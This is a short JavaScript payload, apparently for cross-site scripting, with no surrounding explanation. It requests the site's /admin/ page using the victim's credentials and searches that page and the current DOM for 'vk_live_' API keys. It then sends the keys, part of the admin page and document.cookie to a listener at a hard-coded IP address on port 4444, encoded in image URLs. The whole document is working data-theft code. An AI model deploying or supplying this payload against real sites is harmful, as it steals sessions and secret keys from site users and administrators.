const listener = "http://10.139.32.179:4444";

// Function to send data via Image
function sendData(data) {
    const img = new Image();
    img.src = listener + "/" + encodeURIComponent(data.substring(0, 2000));
}

// Read admin page
fetch("/admin/", { 
    credentials: "include",
    headers: { "Accept": "text/html" }
})
.then(r => r.text())
.then(html => {
    // Extract API key
    const match = html.match(/vk_live_[a-f0-9]{40}/);
    if (match) {
        sendData("API_KEY_FOUND: " + match[0]);
    }
    sendData("ADMIN_PAGE: " + html.substring(0, 500));
})
.catch(e => sendData("ERROR: " + e.message));

// Also try with XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open("GET", "/admin/", true);
xhr.withCredentials = true;
xhr.onload = function() {
    const html = this.responseText;
    const match = html.match(/vk_live_[a-f0-9]{40}/);
    if (match) {
        sendData("XHR_API_KEY: " + match[0]);
    }
};
xhr.send();

// Direct API key search in DOM (if any element contains it)
const body = document.body.innerHTML;
const keyMatch = body.match(/vk_live_[a-f0-9]{40}/);
if (keyMatch) {
    sendData("DOM_API_KEY: " + keyMatch[0]);
}

// Also send cookies
sendData("COOKIES: " + document.cookie);
